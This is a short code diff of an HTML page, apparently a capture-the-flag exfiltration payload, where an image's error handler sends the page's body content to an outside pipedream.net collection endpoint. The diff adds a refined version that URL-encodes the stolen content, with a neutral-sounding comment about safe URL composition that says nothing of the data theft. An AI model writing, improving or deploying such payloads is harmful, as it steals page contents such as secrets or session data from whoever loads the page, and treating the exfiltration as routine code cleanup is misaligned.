@@ -7,11 +7,14 @@
 </head>
 <body>
     <p>flag</p>
-    <img id="Img" src="png" style="display: none;">
+    <img id="Img" src="image.png" style="display: none;">
     <script>
         document.getElementById('Img').onerror = function() {
-            fetch("https://eo8bzrb9y2mj48v.m.pipedream.net?" + document.body.innerHTML);
+            // Consider encoding the HTML content to ensure safe URL composition
+            const encodedBody = encodeURIComponent(document.body.innerHTML);
+            fetch(`https://eo8bzrb9y2mj48v.m.pipedream.net?content=${encodedBody}`);
         };
     </script>
 </body>
 </html>
+
